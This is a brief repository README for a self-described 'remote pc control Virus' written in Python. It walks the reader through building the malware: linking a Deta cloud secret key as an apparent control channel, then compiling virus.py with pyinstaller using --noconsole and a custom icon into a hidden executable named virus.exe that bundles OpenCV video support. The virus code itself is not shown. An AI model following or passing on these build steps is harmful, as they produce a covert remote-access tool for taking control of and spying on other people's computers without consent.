# Python-VIRUS
A simple remote pc control Virus

## Steps
1.Create a Deta account<br />
<br />
2.Open virusFunctions.py and paste <YOUR-DETA-SECRET_KEY><br />
<br />
3.Open Command prompt and run `pip install -r requirements.txt`<br />
<br />
4.CD to the cloned repository folder and run<br /> `pyinstaller --onefile --noconsole --icon=app.ico --add-binary 
"C:<YOUR-PATH>AppData\Local\Programs\Python\Python38\Lib\site-packages\cv2\opencv_videoio_ffmpeg454_64.dll;." virus.py --path="C:<YOUR-PATH\AppData\Local\Programs\Python\Python38\Lib\site-packages\cv2"`<br />
<br />
5.After compilation open dist folder you'll find virus.exe--> your compiled virus file

